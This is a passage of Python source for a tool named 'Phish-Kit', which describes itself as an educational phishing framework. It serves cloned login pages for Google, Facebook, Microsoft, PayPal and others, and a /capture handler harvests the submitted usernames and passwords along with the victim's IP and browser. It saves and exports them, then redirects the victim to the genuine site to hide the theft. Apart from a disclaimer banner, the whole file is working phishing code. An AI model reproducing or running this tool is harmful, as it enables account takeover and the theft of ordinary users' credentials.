            for service in TEMPLATES.keys():
                services_html += f'<a href="/{service}" class="service-btn">{service.title()}</a>\n'
            
            select_page = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Select Service</title>
    <meta charset="UTF-8">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }}
        body {{ background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
        .container {{ width: 100%; max-width: 600px; padding: 40px; }}
        h1 {{ color: white; text-align: center; margin-bottom: 40px; font-size: 32px; }}
        .services {{ display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }}
        .service-btn {{ display: block; padding: 20px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; color: white; text-decoration: none; text-align: center; font-size: 18px; transition: all 0.3s; }}
        .service-btn:hover {{ background: rgba(255,255,255,0.2); transform: translateY(-2px); }}
        .disclaimer {{ margin-top: 40px; padding: 20px; background: rgba(255,0,0,0.1); border: 1px solid rgba(255,0,0,0.3); border-radius: 8px; color: #ff6b6b; font-size: 14px; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>Select Target Service</h1>
        <div class="services">
            {services_html}
        </div>
        <div class="disclaimer">
            This tool is for authorized penetration testing and security education only.<br>
            Unauthorized phishing attacks are illegal.
        </div>
    </div>
</body>
</html>
"""
            self.wfile.write(select_page.encode())
            
        elif path.lstrip('/') in TEMPLATES:
            service = path.lstrip('/')
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(TEMPLATES[service].encode())
            
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found')
    
    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            parsed_data = parse_qs(post_data)
            
            # Flatten the parsed data
            credentials = {k: v[0] for k, v in parsed_data.items()}
            service = credentials.get('service', 'unknown')
            
            # Capture metadata
            capture_data = {
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'unknown'),
                'service': service,
                'credentials': credentials
            }
            
            if self.cred_store:
                entry = self.cred_store.add(capture_data)
                print(f"\n{GREEN}[+] CAPTURED credentials from {service}{RESET}")
                print(f"{CYAN}    IP: {entry['ip']}{RESET}")
                print(f"{CYAN}    Time: {entry['timestamp']}{RESET}")
                for key, value in credentials.items():
                    if key != 'service':
                        print(f"{CYAN}    {key}: {value}{RESET}")
                print("")
            
            # Redirect to real service
            redirects = {
                'google': 'https://accounts.google.com/signin',
                'facebook': 'https://www.facebook.com/login',
                'instagram': 'https://www.instagram.com/accounts/login/',
                'microsoft': 'https://login.live.com',
                'github': 'https://github.com/login',
                'paypal': 'https://www.paypal.com/signin',
                'spotify': 'https://accounts.spotify.com/login'
            }
            
            redirect_url = redirects.get(service, 'https://www.google.com')
            
            self.send_response(302)
            self.send_header('Location', redirect_url)
            self.end_headers()
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found')

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def start_server(port, cred_store):
    RequestHandler.cred_store = cred_store
    server = HTTPServer(('0.0.0.0', port), RequestHandler)
    print(f"{GREEN}[+] Server started on port {port}{RESET}")
    print(f"{CYAN}[+] Access the framework at: http://{get_ip()}:{port}/{RESET}\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Server stopped{RESET}")
        server.shutdown()

def view_credentials(cred_store):
    if not cred_store.credentials:
        print(f"{YELLOW}[!] No credentials captured yet.{RESET}")
        return
    
    print(f"\n{CYAN}{'='*80}{RESET}")
    print(f"{BOLD}{'CAPTURED CREDENTIALS':^80}{RESET}")
    print(f"{CYAN}{'='*80}{RESET}\n")
    
    for i, entry in enumerate(reversed(cred_store.credentials), 1):
        print(f"{MAGENTA}[{i}] Service: {entry['service'].upper()}{RESET}")
        print(f"    Time: {entry['timestamp']}")
        print(f"    IP: {entry['ip']}")
        print(f"    User-Agent: {entry['user_agent'][:60]}...")
        print(f"    Data:")
        for key, value in entry['credentials'].items():
            if key != 'service':
                print(f"      - {key}: {value}")
        print()
    
    print(f"{CYAN}{'='*80}{RESET}")

def export_credentials(cred_store, filename):
    if not cred_store.credentials:
        print(f"{YELLOW}[!] No credentials to export.{RESET}")
        return
    
    with open(filename, 'w') as f:
        f.write("timestamp,service,ip,field,value\n")
        for entry in cred_store.credentials:
            for key, value in entry['credentials'].items():
                if key != 'service':
                    f.write(f"{entry['timestamp']},{entry['service']},{entry['ip']},{key},{value}\n")
    
    print(f"{GREEN}[+] Credentials exported to {filename}{RESET}")

def clear_credentials(cred_store):
    confirm = input(f"{YELLOW}[!] Are you sure? This will delete all captured data (y/N): {RESET}")
    if confirm.lower() == 'y':
        cred_store.credentials = []
        cred_store.save()
        print(f"{GREEN}[+] All credentials cleared{RESET}")
    else:
        print(f"{CYAN}[*] Cancelled{RESET}")

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description='Phish-Kit - Educational Phishing Framework')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Port to run server on')
    parser.add_argument('-f', '--file', default='credentials.json', help='Credentials file')
    parser.add_argument('--view', action='store_true', help='View captured credentials')
    parser.add_argument('--export', help='Export credentials to CSV')
    parser.add_argument('--clear', action='store_true', help='Clear all credentials')
    
    args = parser.parse_args()
    
    cred_store = CredentialStore(args.file)
    
    if args.view:
        view_credentials(cred_store)
        return
    
    if args.export:
        export_credentials(cred_store, args.export)
        return
    
    if args.clear:
        clear_credentials(cred_store)
        return
    
    print(f"{CYAN}[*] Starting server...{RESET}")
    print(f"{CYAN}[*] Credentials will be saved to: {args.file}{RESET}\n")
    
    # Show available templates
    print(f"{BLUE}[*] Available phishing templates:{RESET}")
    for service in TEMPLATES.keys():
        print(f"    - {service}")
    print("")
    
    start_server(args.port, cred_store)

if __name__ == '__main__':
    main()
